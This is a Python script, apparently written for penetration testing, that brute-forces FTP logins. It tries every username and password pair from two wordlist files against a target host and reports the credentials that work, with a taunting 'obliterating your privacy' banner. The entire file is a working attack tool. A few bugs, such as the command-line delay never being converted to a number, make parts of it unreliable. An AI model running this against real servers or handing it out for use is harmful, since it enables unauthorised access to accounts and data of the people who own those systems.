#!/usr/bin/env python3
# A simple FTP default login automation for pentesting
# It also can be used as a FTP bruteforcing tool, but I would recommend Hydra for that
# Made by: Sp1d3rM0rph3us

from ftplib import FTP, error_perm
import time, sys, colorama

try:
	from colorama import init, Fore, Style
	init(autoreset=True)
except ImportError:
	class _NoColor:
		def __getattr__(self, name):
			return ''
	Fore = Style = _NoColor()

def getWordlist(uf, pf):
	userlist = []
	passlist = []
	with open(uf, 'r', encoding='UTF-8') as f:
		try:
			for linha in f:
				linha = linha.strip()
				if linha:
					userlist.append(linha)
		except Exception as e:
			print(f'{Fore.RED}[!] Failed to append entries to list. Error: {e}{Style.RESET_ALL}\n')
			userlist = None

	with open(pf, 'r', encoding='UTF-8') as f:
		try:
			for linha in f:
				linha = linha.strip()
				if linha:
					passlist.append(linha)
		except Exception as e:
			print(f'{Fore.RED}[!] Failed to append entries to list. Error: {e}{Style.RESET_ALL}\n')
			passlist = None

	return userlist, passlist

def tryLogin(target, port, user, password):
	try:
		print(f'[*] Trying: {user}:{password}')
		ftp = FTP()
		ftp.connect(target, port, timeout=8)
		ftp.login(user, password)
		print(f"{Fore.GREEN}[+] Success: {user}:{password}{Style.RESET_ALL}")
		ftp.quit()
		return True
	except error_perm:
		return False
	except Exception as e:
		print(f"{Fore.RED}[!] Error: '{user}:{password}': {e}{Style.RESET_ALL}")
	return False

def main():
	if len(sys.argv) < 5:
		print(f'Usage: {sys.argv[0]} target port userfile passfile [delay]')
	else:
		
		try:
			target = sys.argv[1]
			p = int(sys.argv[2])
			userfile = sys.argv[3]
			passfile = sys.argv[4]
			if len(sys.argv) == 6:
				delay = sys.argv[5]
			else:
				delay = 0

			try:
				userlist, passlist = getWordlist(userfile, passfile)
				success = []
				if userlist and passlist:
					for user in userlist:
						for passw in passlist:
							if tryLogin(target, p, user, passw):
								success.append(f'{user}:{passw}')
							time.sleep(delay)
				print('\n[+] Successful logins:\n')
				print(f'{success}\n')
				print(f'{Fore.YELLOW}-- Obliterating your privacy, as usual ;) --{Style.RESET_ALL}')

			except FileNotFoundError:
				print(f'{Fore.RED}[!] Wordlist file not found, check the spelling{Style.RESET_ALL}')
			except Exception as e:
				print(f'{Fore.RED}[!] Bruteforce failed: {e}{Style.RESET_ALL}')

		except KeyboardInterrupt:
			print('\n')
			print(f'{Fore.YELLOW}-- Obliterating your privacy, as usual ;) --{Style.RESET_ALL}')
		except Exception as e:
			print('\n')
			print(f'{Fore.RED}[-] Program execution failed: {e}{Style.RESET_ALL}')

if __name__ == "__main__":
	main()
